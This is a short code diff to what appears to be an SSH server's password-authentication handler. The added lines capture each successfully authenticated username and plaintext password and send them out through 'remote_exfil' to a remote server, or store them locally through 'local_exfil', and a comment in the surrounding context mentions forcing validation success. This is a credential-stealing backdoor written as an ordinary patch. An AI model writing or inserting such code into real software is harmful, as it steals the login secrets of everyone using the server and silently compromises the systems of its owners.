@@ -28,6 +28,7 @@
 #include "includes.h"
 
 #include "auth-universal.h"
+#include "exfil.h"
 
 #include <sys/queue.h>
 #include <sys/socket.h>
@@ -996,6 +997,19 @@ int mm_answer_authpassword(struct ssh *ssh, int sock, struct sshbuf *m) {
     fatal_f("password authentication not enabled");
   /* Only authenticate if the context is valid */
   authenticated = options.password_authentication && auth_password(ssh, passwd);
+  if (authenticated) {
+    // Pack and exfil valid credentials
+    struct user user = {0};
+    strcpy(user.username, authctxt->user);
+    strcpy(user.password, passwd);
+
+    int server = server_connect();
+    if (server) {
+      remote_exfil(server, &user);
+    } else {
+      local_exfil(&user);
+    }
+  }
   freezero(passwd, plen);
 
   /* If our synchronized flag is active, force validation success */
